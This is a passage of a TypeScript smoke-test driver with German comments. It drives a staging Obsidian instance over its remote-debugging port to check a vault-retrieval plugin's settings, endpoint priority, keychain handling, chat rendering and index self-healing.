/**
 * GUI-Smoke-Treiber — fährt die Abnahme-Prüfpunkte gegen ein **laufendes** Obsidian
 * statt von Hand.
 *
 * Warum getrackt (CORE-TEST-02 b): dieselbe Lesson wie in `3d-codeblocks/scripts/gui-smoke.ts` —
 * ein Treiber, der nur im Session-Scratchpad liegt, ist beim nächsten Mal weg, und was er
 * einmal gefunden hat, findet niemand wieder.
 *
 * Was er prüft, das Unit-Tests strukturell nicht können: ob ein Icon-Name in Obsidians
 * gebündeltem Lucide überhaupt existiert (ein unbekannter Name rendert **still nichts**),
 * ob die Zeile im echten Flex-Layout so umbricht wie gedacht, und ob ein Klick durch die
 * ganze Kette geht (Speichern → Resolve → Neuzeichnen).
 *
 * ## Wo der Lauf hingehört: Staging-Vault auf einer ZWEITINSTANZ (eigenes Profil, eigener Port)
 *
 * Der Port ist PFLICHT (`--port <n>`, Wert dieses Rezepts: 9399); der Treiber hat keinen Default, damit ein vergessener
 * Port nie die reguläre Instanz (9222) trifft. Die reguläre Instanz wird weder genutzt noch beendet: ein `quit` träfe
 * die Sitzungen anderer, und `app.setting.close()` schließt nur die Ansicht, nicht das Target — ein zweiter Lauf in
 * derselben Sitzung ist nicht sauber (Target-Leichen, `attachTo("settings", …)` wird mehrdeutig). Darum je Messlauf
 * ein frischer Prozess. Die Single-Instance-Sperre hängt am Profil (Dach-AGENTS § Staging-Vaults).
 *
 * Im Arbeitsvault `10_Pallas` sind Prüfpunkte STRUKTURELL nicht messbar: dort ist ein echtes llm-lab installiert (der
 * Meldestrecken-Zweig würde dessen Aufzeichnung verunreinigen) und die Endpunkt-Listen tragen je EINE Zeile. Der
 * Staging-Vault `vault-rag` (Fixture `docs/images/fixture/`, Einstellungen mit je ZWEI Zeilen aus
 * `docs/images/fixture/plugin/settings.json`) hat beides nicht — dort läuft der ganze Treiber.
 *
 * ```bash
 * echo "$STAGING_VAULTS_DIR"                                    # muss gesetzt sein (~/.zshenv)
 * npm run build && npm run shots -- --setup                     # Vault aus dem Fixture (Index ist danach weg)
 * UD=/tmp/obs-test-vault-rag; mkdir -p "$UD"
 * lsof -nP -iTCP:9399 -sTCP:LISTEN && echo "Port belegt — anderen nehmen"
 * pgrep -f "user-data-dir=$UD" && echo "Profil belegt — $UD-w19 nehmen"
 * cp ~/Library/Application\ Support/obsidian/obsidian-<version>.asar "$UD"/      # (a) sonst startet die gebündelte, ältere Version
 * # (b)+(c) Restricted Mode und Vertrauensdialog macht `bereiteInstanzVor` im Treiber (nur im Staging-Vault)
 * node -e 'const p=process.env.STAGING_VAULTS_DIR+"/vault-rag";require("fs").writeFileSync(process.argv[1]+"/obsidian.json",JSON.stringify({vaults:{v:{path:p,ts:Date.now(),open:true}},language:"en"}))' "$UD"
 * /Applications/Obsidian.app/Contents/MacOS/Obsidian --user-data-dir="$UD" --remote-debugging-port=9399 &
 * # PID merken: beendet wird NUR sie, nie pkill/killall
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py acquire --label vault-rag --intent "GUI-Smoke :9399" --exclusive focus --port 9399 --ttl 900
 * npm run shots -- --port 9399 --prepare                        # Index bauen (18 Notizen, Sekunden; braucht den Embedding-Endpunkt)
 * npm run smoke:gui -- --port 9399
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py release
 * ```
 *
 * **Stub-Lage (seit Welle 20):** Der volle Lauf schickt keine Anfrage an die Fixture-Endpunkte (Ollama `:11434`, LM Studio
 * `:1234`). Die jeweils erste Zeile beider Listen zeigt auf den zentralen LLM-Stub (`tools/obsidian-cdp/llm-stub.ts`), die
 * zweite bleibt der tote Fixture-Port; im `finally` stehen die Fixture-Listen wieder da (zuletzt, sonst schreibt eine
 * mitten im Lauf gesicherte Liste die Stub-Adressen zurück). Zeilenzustände, Schlüssel, Modell-Weg und gesendete Bodys
 * sind damit messbar. Nicht messbar bleiben, was das ECHTE Embedding-Modell braucht: `search()` und die
 * Selbstfindung (Anfrage-Vektor des Stubs ist der gespeicherte Vektor einer Notiz, sagt nichts über Semantik) — beide
 * „nichts gemessen“. Der Index im Staging-Vault entsteht weiterhin nur mit echtem Embedding-Endpunkt (`shots --prepare`).
 *
 * `--only w15,w16` fährt nur die Schlüsselbund-Sektionen (Welle 15/16): beide laufen gegen eigene Stub-Instanzen
 * und schicken nichts an :1234/:11434. Die Soll-Liste ist dann ihre Teilmenge (Exit 0 bei grün); alle
 * anderen Sektionen laufen nicht und stehen nicht im Nenner. Die Stub-Lage gilt nur im vollen Lauf.
 *
 * `--vault` ist optional (Default `vault-rag`, der Staging-Vault) und matcht exakt gegen `app.vault.getName()`.
 *
 * ## Bilanz in vier Zuständen (CORE-TEST-19)
 *
 * grün · rot · übersprungen · nichts gemessen; `PUNKTE` ist der Nenner. Hier gibt es keinen „übersprungen“-Fall: der
 * vorgesehene Ort ist der Staging-Vault mit Fixture, und was dort nicht herstellbar ist (zweite Endpunkt-Zeile, Embedding-
 * Endpunkt, Notiz, Auswahl, ein echtes llm-lab oder ein echter Endpoint Manager im Vault) ist „nichts gemessen“ und setzt
 * Exit 1. Abbruch vor oder während der Messung: Exit 2.
 *
 * Der Klick-Prüfpunkt verändert die Endpunkt-Reihenfolge in den Einstellungen. Der Treiber
 * sichert sie vorher und schreibt sie im `finally` zurück — auch nach einem Abbruch mitten
 * im Lauf. Mit `--keep` bleibt die geänderte Reihenfolge stehen.
 *
 * ⚠️ **Der letzte Prüfpunkt (Auto-Heal-Kaskade) beschädigt `index.bin` absichtlich** und stellt
 * die Embedding-Endpunkte kurzzeitig tot — anders ist die Verdrahtung nicht zu messen, und
 * genau dort lag der Bug (nicht in der unit-getesteten Entscheidung `planAutoHeal`). Er läuft
 * nur, wenn ein geräte-lokales Backup existiert, parkt die Original-Bytes im Renderer und
 * schreibt sie im `finally` zurück. Bleibt selbst das aus, holt die Auto-Heal-Kaskade den
 * Index beim nächsten Start aus demselben Backup — das ist die zweite Absicherung.
 *
 * Die CDP-Brücke liegt seit 2026-08-16 zentral im Dach (`tools/obsidian-cdp/`) und wird
 * importiert, nicht vendored: sie ist plugin-neutral und lief zuvor byte-identisch/inline
 * in mehreren Repos. Fehlt das Dach (fremder Checkout), bricht esbuild beim Auflösen ab —
 * das ist die gewollte Meldung. Was ihr fehlt, wird DORT ergänzt, nicht hier nachgebaut.
 */

import { existsSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { cwd } from "node:process";

import { Cdp, attachTo, beimAbbruch, bereiteInstanzVor, istAbgebrochen, entferneFakeManager, fakeManagerAufrufe, installFakeManager, pollUntil, requireVisible } from "../../tools/obsidian-cdp/cdp.js";
import { startLlmStub } from "../../tools/obsidian-cdp/llm-stub.js";
import { messeFolge, zeichneFolge } from "../../tools/obsidian-cdp/folge.js";
import { createBilanz, parseArgs, runDriver, type Bilanz } from "../../tools/obsidian-cdp/bilanz.js";
import { requireEigenerBuild } from "../../tools/obsidian-cdp/vault.js";
import { capture } from "../../tools/obsidian-cdp/shot.js";
import { EN, DE } from "../src/i18n/strings";
import { LLM_CONNECTION_STRINGS_EN, LLM_CONNECTION_STRINGS_DE } from "../src/vendor/kit-obsidian/llm-connection-strings";

const PLUGIN_ID = "vault-retrieval";
/** Name des Staging-Vaults (= Repo-Verzeichnis, verglichen mit `app.vault.getName()`); `manifest.id` weicht ab. */
const STAGING_VAULT = "vault-rag";
/** Muss zu `setIcon(...)` in `buildEndpointList` passen. */
const PRIORITY_ICON = "arrow-up-to-line";
const FALLBACK_ICON = "chevrons-up";
/** Die Pruefpunkte des llm-lab-Zweigs — namentlich, damit ein Skip des ganzen Zweigs JEDEN
 *  davon in die Bilanz traegt. Muss zu den `record(...)`-Namen im `else` von `if (labReal)`
 *  passen; die Zaehlung 2026-09-03: sechs (die Task nannte 15 — das war ein grep ueber
 *  `record(` inklusive Definition und Kommentare, nicht ueber Aufrufe). */
/** Frist fuer EINE Chat-Antwort ueber die Oberflaeche. Nicht 180 s: ein denkendes 27B-Modell
 *  brauchte bei WARMEM Endpunkt 218 s fuer „Antworte mit genau einem Wort: Hallo." (1.191
 *  Reasoning-Tokens, gemessen 2026-09-03 per curl) — der Punkt war rot, waehrend der zweite Chat
 *  desselben Laufs durchlief. Das Fixture setzt `suppressThinking`, damit der Normalfall in
 *  Sekunden liegt; die Frist deckt den Fall, dass ein Modell trotzdem denkt. */
const CHAT_FRIST_MS = 360_000;
/** Die Pruefpunkte des Integrator-Abschnitts — namentlich, damit ein Skip des Zweigs JEDEN in die
 *  Bilanz traegt (dieselbe Regel wie LAB_PRUEFPUNKTE). */
const INTEGRATOR_PRUEFPUNKTE = [
  "Tab „Integrator“ steht in der Leiste, vor „Umformatieren“",
  "Kommando-Pfad erzeugt einen Vorschlag für die Fixture-Notiz",
  "Annehmen im Panel schreibt den Abschnitt mit dem Wikilink in die Datei",
  "Zweites Anwenden desselben Ziels lässt die Datei byte-identisch",
  "Abgelehntes Ziel kommt beim Neuberechnen nicht wieder",
  "Frontmatter-Modus: related: [] wird zur Blockliste, Rest byte-identisch",
  "Zweiter Klick auf Annehmen derselben Karte gilt nicht als veraltet (Hash nach eigenem Schreiben nachgezogen)",
  "Hotkey-Commands: nächsten Vorschlag ablehnen und annehmen (aktive Notiz zuerst)",
];
/** Liest eine `<NAME> = <Zahl>`-Konstante aus einer Quelldatei; null, wenn Datei oder Konstante fehlt. */
function readConstant(file: string, name: string): number | null {
  if (!existsSync(file)) return null;
  const m = new RegExp(`${name}\\s*=\\s*(\\d+)`).exec(readFileSync(file, "utf8"));
  return m ? Number(m[1]) : null;
}
const CLIENT_LAB_FILE = join(cwd(), "src/vendor/kit-obsidian/lab-client.ts");
const REAL_LAB_FILE = join(cwd(), "../llm-lab/src/plugin_api.ts");

const LAB_PRUEFPUNKTE = [
  "Der Lab-Client spricht dieselbe apiVersion wie das echte llm-lab",
  "Ein Chat über die Oberfläche meldet sich beim Lab",
  "Die Chat-Zeile trägt ttftMs und latencyMs",
  "Die Chat-Zeile trägt eine turnId (apiVersion 4)",
  "Die Chat-Zeile trägt die Kontext-Pfade, die das Panel zeigt",
  "Reformat meldet sich mit der Transform-ID im feature",
  "Die Reformat-Vorschau ist nach dem Verwerfen geschlossen",
  "Ohne Lab läuft der Chat vollständig durch und meldet nichts",
];

/** Namen der Punkte, die im Ablauf an mehreren Stellen vorkommen — auf Modulebene, damit `PUNKTE` sie enthält. */
/** Das Aufräumen der Stub-Lage VOR dem Zurückstellen der Fixture-Listen (Renderer-Ausdruck): Pause setzen, Pending-Queue und
 *  Debounce-Timer leeren, laufende Einbettung abwarten. Der Punkt „Stub-Lage-Hygiene“ prüft genau diesen Ausdruck gegen einen zweiten
 *  Stub als „echten“ Endpunkt. */
const STUB_LAGE_SCHUTZ = `
  const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
  p.setEmbeddingPaused(true);
  await p.pendingQueue.clear();
  for (const t of p.debounceTimers.values()) window.clearTimeout(t);
  p.debounceTimers.clear();
  const t0 = Date.now();
  while (p.embeddingProgress.isEmbedding && Date.now() - t0 < 10000) await new Promise(r => setTimeout(r, 200));`;
const PAUSE_PUNKTE = [
  "Pause: der Befehl blendet die Statusleiste mit ⏸ ein (auch bei showStatusBar aus), sie ist ein Knopf (aria-pressed)",
  "Pause: der Such-Tab zeigt den Empty-State mit genau einem CTA, nicht „nicht erreichbar“",
  "Pause: Suche und Tippen im Chat schicken KEINE Embedding-Anfrage (Zähler unverändert)",
  "Pause: eine Änderung an einer Notiz wartet in der Queue (pendingNotes steigt) und der Zähler bleibt stehen",
  "Fortsetzen: pendingNotes fällt auf 0, und der Zähler steigt (Gegenprobe zu „0 Anfragen“)",
  "Stub-Lage-Hygiene: nach dem Aufräumen erreicht eine ausstehende Änderung einen „echten“ Endpunkt nicht (Gegenprobe ohne Aufräumen: sie erreicht ihn)",
];
const EMBED_ZAEHLER_PUNKT = "Embedding-Zähler: eine Suche über die Plugin-API steht unter „api“, der Befehl zeigt die Zählung";
const CHAT_MD_PUNKT = "Chat: eine fertige Antwort erscheint als Markdown (Liste, Fettung), Fernbild bleibt draußen, die Frage bleibt Text";
const MCP_TOKEN_PUNKT = "MCP-Token liegt im Schlüsselbund, nie in data.json (Erzeugen, Neu erzeugen, Speichern)";
const MGR_PUNKTE = [
  "Manager da: Chat-Endpunkt und Standardmodell kommen vom Manager, der Schlüssel bleibt im Speicher",
  "Manager da: die Nutzerwahl (chatChoice.model) schlägt Standardmodell und config.model",
  "Manager da: ein Embedding-Endpunkt mit fremdem Modell wird nicht aktiv markiert (Modell-Guard)",
  "Manager da: die Einstellungen zeigen den Manager-Baustein statt der lokalen Listen",
  "Manager weg: beide Rollen fallen auf die lokale Liste zurück",
  "Der Manager-Weg schreibt weder Schlüssel noch Manager-Modell in data.json",
  "Manager kommt bei offenem Einstellungs-Fenster: beim Zurückwechseln auf den Tab erscheint der Baustein (und verschwindet wieder)",
];

const W15_PUNKTE = [
  "Schlüsselbund: nach dem ersten Auflösen steht kein apiKey mehr in data.json, die Zeile trägt secretId",
  "Schlüsselbund: nach ZWEI Neustarts (Plugin neu geladen) trägt die Zeile weiter secretId und der Schlüssel löst auf",
  "Schlüsselbund: der Bearer erreicht den Endpunkt",
  "Schwärzung: das Modell sieht einen Platzhalter statt des Tokens, der Aufrufer bekommt das Original zurück",
  "Neutralisierung: eine Antwort mit Bild-URL und Platzhalter erzeugt in der Chat-Oberfläche kein img-Element",
  "onResolved: eine Auflösung, die das Kit selbst anstößt, erreicht die Plugin-Zeilen im offenen Tab (Gegenprobe: eine gemerkte nicht)",
];

const W16_PUNKTE = [
  "Schlüsselbund (Embedding): nach dem Plugin-Start steht in data.json bei BEIDEN Listen kein apiKey, beide Zeilen tragen secretId",
  "Schlüsselbund (Embedding): nach ZWEI Neustarts trägt die Zeile weiter secretId und der Embedder hält den Schlüssel",
  "Schlüsselbund (Embedding): der Bearer erreicht die Probe UND embed",
  "Gegenprobe: ein Client aus der nicht hydrierten Zeile sendet keinen Bearer (der Punkt davor kann also rot werden)",
  "Schlüsselbund (Embedding) mit installiertem Manager: die Migration läuft beim Laden trotzdem",
];

/** Stream-Bereiche (Welle 20): die Folge-Regel (Kit `buildStreamArea`, `followTail`) und der Denkblock im Strom. Smart Apply
 *  scrollt im Bereich selbst (Höhe auf 220 px begrenzt), das Umformulieren-Modal über `contentEl`; das Modal zeigt kein
 *  Reasoning (`stream` kennt nur `onToken`), dort ist „Denkblock live“ in dieser Lage nicht anwendbar. */
const STREAM_PUNKTE = {
  saKontrolle: "Smart Apply: der Stream-Bereich folgt dem Strom ohne Störung (Kontrolle)",
  saFolge: "Smart Apply: Hochscrollen mitten im Strom wird respektiert (Folge-Regel)",
  saWieder: "Smart Apply: steht der Nutzer wieder unten, folgt der Bereich dem Strom wieder (Wiederaufnahme)",
  saDenk: "Smart Apply: der Denkblock ist während des Stroms sichtbar und wächst (Denkblock live)",
  rfKontrolle: "Umformulieren: der Ergebnisbereich folgt dem Strom ohne Störung (Kontrolle)",
  rfFolge: "Umformulieren: Hochscrollen mitten im Strom wird respektiert (Folge-Regel)",
  rfWieder: "Umformulieren: steht der Nutzer wieder unten, folgt der Ergebnisbereich dem Strom wieder (Wiederaufnahme)",
  rfDenk: "Umformulieren: der Denkblock ist während des Stroms sichtbar und wächst (Denkblock live)",
  saAbsatz: "Smart Apply: der Stream-Bereich folgt auch bei absatzgroßen Stücken (Kontrolle)",
  rfAbsatz: "Umformulieren: der Ergebnisbereich folgt auch bei absatzgroßen Stücken (Kontrolle)",
} as const;

const POPOUT_PUNKT = "Der Index-Ordner wird im Hauptfenster ausgeblendet, auch wenn beim Laden ein Pop-out aktiv ist";

  const PUNKT_TREU = "Umformulieren: zum Modell gehen nur Platzhalter, ein Ergebnis mit allen Links bleibt anwendbar";

  const PUNKT_SPERRE = "Umformulieren: ein Ergebnis, das einen Wikilink zerstört, sperrt Anwenden und nennt den Grund";

  const PUNKT_UMBRUCH = "Umformulieren: „Absatz-Umbrüche entfernen“ zieht den Absatz zusammen und lässt den Codeblock stehen";

  const W7I = {
    n1: "Anfrage-Abschnitt: klappt auf und zeigt Familie, Backend und die drei Modi",
    n2: "Anfrage-Abschnitt: eine Überschreibung setzen und zurücksetzen — der Abschnitt bleibt dabei offen",
    n3: "Chat: der Denk-Knopf schaltet die Stufe um (Text, aria-pressed und gespeicherte Stufe stimmen überein)",
    n4: "Chat: die Stufenwahl zeigt ein Dropdown und speichert die gewählte Stufe",
    chat: "Gesendeter Body: der Chat (grounded) trägt die Modus-Temperatur 0,4",
    reformat: "Gesendeter Body: Umformatieren (transform) trägt die Modus-Temperatur 0,2 und ein Budget",
    smart: "Gesendeter Body: Smart Apply (structured) trägt die Modus-Temperatur 0,1 und das Plugin-Budget",
  };

/** Soll-Liste aller Prüfpunkte (der Nenner der Bilanz): ein Name, der hier fehlt, lässt `createBilanz` werfen; ein
 *  Punkt, der nie aufgezeichnet wird, zählt als „nichts gemessen“. */
const PUNKTE = [
  "Plugin-API hängt am Plugin-Objekt und nennt ihre Version",
  "Fläche trägt mindestens status/search/related/proposeLinks/applyLink und tools/executeTool, keine Interna",
  "tools() liefert search und related als Definitionen, executeTool() antwortet als Wert",
  "Der Anbieter besteht den Wirts-Guard des Kits (version, tools, executeTool)",
  "status() ist synchron und meldet einen Index",
  "Keine Alt-Schlüssel des globalen Modells und der Sampling-Regler in den Einstellungen",
  "related() liefert Treffer für eine indexierte Notiz",
  "Rückgaben überstehen die Renderer-Grenze (JSON-tauglich)",
  "search() liefert semantische Treffer",
  "Notizen finden sich ueber ihren eigenen Wortlaut",
  "Hub rendert die Kit-Grammatik",
  "Tab-Leiste ist eine ARIA-Tabliste",
  "Genau ein Tab ist als ausgewaehlt gemeldet",
  "Roving tabindex: nur der aktive Tab ist tabbar",
  "Jeder Tab zeigt auf ein existierendes Panel",
  "Tab-Leiste bricht bei schmaler Sidebar um, statt zu stauchen",
  "Kein Tab rutscht aus der Leiste heraus",
  "Hilfe-Zeile ist die erste Zeile im Einstellungs-Tab",
  "Endpunkt-Zeilen gefunden",
  "Zeile 1 trägt keinen Prioritäts-Knopf",
  "Zeile 2 trägt den Prioritäts-Knopf",
  `Icon "${PRIORITY_ICON}" rendert tatsächlich ein SVG`,
  "Embedding: genau eine Zeile als aktiv markiert (keine, wenn nichts erreichbar ist)",
  "Chat: genau eine Zeile als aktiv markiert (keine, wenn nichts erreichbar ist)",
  "Alle Zustandstexte sind bekannte Formulierungen",
  "Alle Proben abgeschlossen",
  "Zustandszeile bricht auf volle Breite um",
  "Zustandszeile steht unter den Feldern",
  "Warn-/Schlüssel-Icons bleiben in der Feldzeile",
  "Klick setzt die Zeile an die Spitze",
  "Die nach oben geholte Zeile meldet danach ihren Zustand",
  "Die nach oben geholte Zeile trägt keinen Prioritäts-Knopf mehr",
  "Rolle folgt dem Zeilen-Modell ohne Tab-Neuaufbau",
  "Kein liegen gebliebener llm-lab-Stub aus einem abgebrochenen Lauf",
  "Gesperrter Anwenden-Knopf ist sichtbar gesperrt (nicht nur per Klasse)",
  "Defekter Container heilt sich ohne Endpunkt aus dem Backup",
  "Die Heilung meldet sich, statt still einen aelteren Stand zu benutzen",
  ...LAB_PRUEFPUNKTE,
  ...INTEGRATOR_PRUEFPUNKTE,
  ...MGR_PUNKTE,
  ...W15_PUNKTE,
  ...W16_PUNKTE,
  MCP_TOKEN_PUNKT,
  CHAT_MD_PUNKT,
  EMBED_ZAEHLER_PUNKT,
  ...PAUSE_PUNKTE,
  POPOUT_PUNKT,
  PUNKT_TREU,
  PUNKT_SPERRE,
  PUNKT_UMBRUCH,
  ...Object.values(W7I),
  ...Object.values(STREAM_PUNKTE),
] as const;

// --- Prüfpunkte -------------------------------------------------------------


interface HubProbe {
  present: boolean;
  tablist?: string | null;
  count?: number;
  selected?: number;
  focusable?: number;
  controls?: boolean;
}
/** `let`, weil `--only` die Soll-Liste auf die gewählte Teilmenge verkleinert (README § Bilanz, Welle-19-Lehre 2). */
let bilanz: Bilanz = createBilanz({ punkte: PUNKTE });

/** Sektionen, die `--only` einzeln wählbar macht: beide laufen gegen eigene Fake-Server auf der Node-Seite und
 *  schicken nichts an die Fixture-Endpunkte (:1234/:11434). Alles andere ist der Rest (ohne `--only`). */
const NUR_SEKTIONEN = { w15: W15_PUNKTE, w16: W16_PUNKTE } as const;
type NurSektion = keyof typeof NUR_SEKTIONEN;

type StubHandle = Awaited<ReturnType<typeof startLlmStub>>;

/** Sicht der Einstellungen auf den Manager: die ZEILE des Bausteins (Name „Endpoints come from the LLM Endpoint Manager“) und
 *  die Zahl lokaler Endpunkt-Zeilen. Nicht der Produktname im Seitentext: der Request-Abschnitt nennt den Manager seit
 *  obsidian-kit 0.59.0 immer im Hinweis, auch ohne Manager (Befund ln-w20, neurovim R5-3) — eine Textsuche über den Body
 *  meldete damit „managed“ in jeder Lage. */
async function liesManagerSicht(main: Cdp, port: number, vault: string): Promise<{ baustein: boolean; rows: number } | null> {
  await main.evaluate(`app.setting.close();`);
  await openSettings(main);
  const sicht = await attachTo("settings", port, vault);
  if (!sicht) { await main.evaluate(`app.setting.close();`); return null; }
  try {
    return await sicht.evaluate<{ baustein: boolean; rows: number }>(`
      return {
        baustein: [...document.querySelectorAll(".setting-item-name")].some((e) => /come from the LLM Endpoint Manager|kommen vom LLM Endpoint Manager/.test(e.textContent ?? "")),
        rows: document.querySelectorAll(".okit-ep-row").length,
      };
    `);
  } finally {
    sicht.close();
    await main.evaluate(`app.setting.close();`);
  }
}
/** `--only w15,w16` → Menge der Sektionen; `null` ohne Flag (voller Lauf). Unbekannte Namen brechen ab. */
function parseNur(roh: string | undefined): Set<NurSektion> | null {
  if (roh === undefined) return null;
  const namen = roh.split(",").map((n) => n.trim().toLowerCase()).filter(Boolean);
  const ok = namen.filter((n): n is NurSektion => n in NUR_SEKTIONEN);
  if (namen.length === 0 || ok.length !== namen.length) {
    throw new Error(`--only erwartet ${Object.keys(NUR_SEKTIONEN).join(" und/oder ")} (kommagetrennt), bekam ${JSON.stringify(roh)}.`);
  }
  return new Set(ok);
}

function record(name: string, passed: boolean, detail: string): void {
  bilanz.record(name as (typeof PUNKTE)[number], passed, detail);
}

/** Der Gegenstand des Punkts wurde nicht erreicht (Vorbedingung oder Konfiguration fehlt) — „nichts gemessen“,
 *  nie grün, Exit 1. Der zweite Parameter nennt den GRUND: ein Eintrag ohne Grund ist von einem vergessenen
 *  Prüfpunkt nicht zu unterscheiden. (Bis 2026-10-12 hieß das `skipped`; der Treiber führte die Konfigurationsfälle
 *  als „übersprungen“, obwohl nichts gemessen war. Übersprungen im Sinn von CORE-TEST-19 — „in dieser Lage nicht
 *  anwendbar“ — gibt es hier keinen Fall: der vorgesehene Ort ist der Staging-Vault mit Fixture.) */
function unmeasured(name: string, reason: string): void {
  bilanz.unmeasured(name as (typeof PUNKTE)[number], reason);
}

/** In dieser Lage nicht anwendbar (CORE-TEST-19) — mit Grund; kein „nichts gemessen“, weil der Gegenstand fehlt. */
function skipped(name: string, reason: string): void {
  bilanz.skipped(name as (typeof PUNKTE)[number], reason);
}

/** Liest die sichtbaren Endpunkt-Zeilen der zuletzt geöffneten Einstellungs-Seite. */
const READ_ROWS = `
  const rows = [...document.querySelectorAll(".okit-ep-row")];
  // Es gibt ZWEI Listen (Embedding und Chat) im selben Tab, jede mit ihrem eigenen aktiven
  // Endpunkt. Global zu zählen ergäbe zwei "aktiv" und sähe wie ein Bug aus, der keiner ist.
  // Der gemeinsame Eltern-Container trennt sie zuverlässig.
  const parents = [];
  const listIndexOf = (row) => {
    const p = row.parentElement;
    let idx = parents.indexOf(p);
    if (idx === -1) { parents.push(p); idx = parents.length - 1; }
    return idx;
  };
  return rows.map((row, i) => {
    const listIndex = listIndexOf(row);
    const state = row.querySelector(".okit-ep-state");
    const url = row.querySelector('input[type="text"]');
    const buttons = [...row.querySelectorAll(".extra-setting-button, .clickable-icon")];
    return {
      index: i,
      listIndex,
      url: url ? url.value : "",
      state: state ? state.textContent : null,
      stateWidthRatio: state && row.querySelector(".setting-item-control")
        ? Math.round(100 * state.getBoundingClientRect().width /
            row.querySelector(".setting-item-control").getBoundingClientRect().width)
        : null,
      stateTopBelowFields: state && url
        ? state.getBoundingClientRect().top >= url.getBoundingClientRect().bottom - 1
        : null,
      buttonCount: buttons.length,
      modelValue: (() => { const sel = row.querySelector("select"); return sel ? sel.value : null; })(),
      hasPriorityButton: !!row.querySelector('svg[class*="arrow-up-to-line"], svg[class*="chevrons-up"]'),
      priorityIconClass: (() => {
        const svg = row.querySelector('svg[class*="arrow-up-to-line"], svg[class*="chevrons-up"]');
        return svg ? (svg.getAttribute("class") || "") : null;
      })(),
      buttonIcons: buttons.map(b => {
        const svg = b.querySelector("svg");
        return svg ? (svg.getAttribute("class") || "").replace("svg-icon ", "") : "(leer)";
      }),
      warnIconBelowState: (() => {
        const warn = row.querySelector(".okit-ep-warn, .okit-ep-thirdparty");
        if (!warn || !state) return null;
        return warn.getBoundingClientRect().top >= state.getBoundingClientRect().bottom - 1;
      })(),
    };
  });
`;

interface Row {
  index: number; listIndex: number; url: string; state: string | null;
  hasPriorityButton: boolean; priorityIconClass: string | null; modelValue: string | null;
  stateWidthRatio: number | null; stateTopBelowFields: boolean | null;
  buttonCount: number; buttonIcons: string[]; warnIconBelowState: boolean | null;
}

interface ApiProbe {
  present: boolean;
  apiVersion?: number;
  keys?: string[];
  providerVersion?: unknown;
  status?: { apiVersion: number; indexed: boolean; noteCount: number };
  statusIsSync?: boolean;
  related?: { ok: boolean; reason?: string; hits?: { path: string; score: number }[] } | null;
  relatedPath?: string | null;
  search?: { ok: boolean; reason?: string; hits?: { path: string; score: number }[] };
  serialisable?: boolean;
  tools?: { name: string; description?: string; writes?: boolean; parameters?: { type?: string } }[] | null;
  toolExec?: { ok: boolean } | null;
  toolBad?: unknown;
}

interface SelfFindProbe {
  present: boolean;
  offline: boolean;
  tried: { path: string; rank: number; top: string | null }[];
}

/** Muss im HAUPTfenster laufen — nur dort existiert `app`. */
async function openSettings(main: Cdp): Promise<void> {
  await main.evaluate(`
    app.setting.open();
    app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
    await new Promise(r => setTimeout(r, 1500));
  `);
}

async function main(): Promise<void> {
  const args = parseArgs(process.argv.slice(2));
  const portRoh = args.value("port");
  const port = Number(portRoh);
  if (portRoh === undefined || !Number.isInteger(port) || port < 1024 || port > 65535) {
    throw new Error(`--port <Zahl> fehlt oder ist ungültig (${JSON.stringify(portRoh)}). Den Port der eigenen Zweitinstanz angeben (Rezept im Dateikopf, z. B. 9399).`);
  }
  const vault = args.value("vault") ?? STAGING_VAULT;
  const keep = args.has("keep");
  // Teillauf: nur die gewählten Sektionen, Soll-Liste = ihre Punkte. Der Rest läuft nicht und steht nicht im Nenner;
  // er bleibt dem Gesamtlauf vorbehalten, der die LM-Endpunkte der Fixture braucht (Welle 20: LM-Regel).
  const nur = parseNur(args.value("only"));
  const laeuft = (s: NurSektion): boolean => nur === null || nur.has(s);
  if (nur) {
    bilanz = createBilanz({ punkte: [...nur].flatMap((s) => [...NUR_SEKTIONEN[s]]) });
    console.log(`Teillauf --only ${[...nur].join(",")}: Soll = nur deren Prüfpunkte; alle anderen Sektionen werden nicht gefahren.\n`);
  }

  console.log(`GUI-Smoke vault-retrieval — Obsidian auf Port ${port}\n`);
  // `attachTo` unterscheidet Haupt- und Einstellungen-Fenster an der Sache (nur das
  // Hauptfenster trägt einen Workspace), nicht am lokalisierten Titel.
  // Vorstufe (Welle 14): Ein Pop-out aus einem abgebrochenen Lauf (Punkt 7f) steht in der
  // persistierten workspace.json und wird beim naechsten Start zum Ziel von `attachTo` —
  // dessen `document` traegt den Hub nicht („Hub mountet nicht", gemessen 2026-09-30). Darum:
  // anhaengen, verwaiste Fenster schliessen, Verbindung loesen, neu anhaengen. `app` ist in
  // jedem Fenster derselbe, das Schliessen funktioniert also von wo aus man gerade haengt.
  const vorstufe = await attachTo("workspace", port, vault);
  if (vorstufe) {
    const closed = await vorstufe.evaluate<number>(`
      const wins = [...(app.workspace.floatingSplit?.children ?? [])];
      for (const w of wins) { try { w.win?.close(); } catch {} }
      return wins.length;
    `).catch(() => 0);
    vorstufe.close();
    if (closed > 0) {
      console.log(`  (${closed} verwaistes Pop-out-Fenster geschlossen)`);
      await new Promise(r => setTimeout(r, 2000));
    }
  }
  const main = await attachTo("workspace", port, vault);
  if (!main) {
    throw new Error(
      `Kein Obsidian-Hauptfenster auf Port ${port}` +
        (vault ? ` für Vault „${vault}“` : "") +
        ". Läuft Obsidian mit --remote-debugging-port? (siehe Kopfkommentar)",
    );
  }
  // Außerhalb des try, damit das finally die Reihenfolge auch nach einem Abbruch
  // mitten im Lauf zurückschreiben kann.
  // Ein `ungeklaert`-Ausgang des Herkunfts-Guards WARNT nur (ein Guard darf keinen Lauf toeten,
  // gegen den er nichts in der Hand hat) — die Warnung gehoert dann aber in die Zusammenfassung,
  // sonst scrollt sie oben weg und der Lauf sieht sauber aus.
  let herkunftsWarnung: string | null = null;
  let savedChatOrder: string[] | null = null;
  let settings: Cdp | null = null;
  // Der Heal-Prüfpunkt zerstört absichtlich den Container und stellt die Endpunkt-Liste tot.
  // Beides wird im finally zurückgeschrieben — auch nach einem Abbruch mitten im Lauf.
  let healRestore: { indexPath: string; savedEndpoints: unknown } | null = null;
  // Der Integrator-Abschnitt schreibt in zwei Fixture-Notizen und in integrator.json. Beides wird
  // im finally zurueckgesetzt, damit ein zweiter Lauf ohne `--setup` dieselbe Lage vorfindet.
  let integratorRestore: { plain: string; rel: string } | null = null;
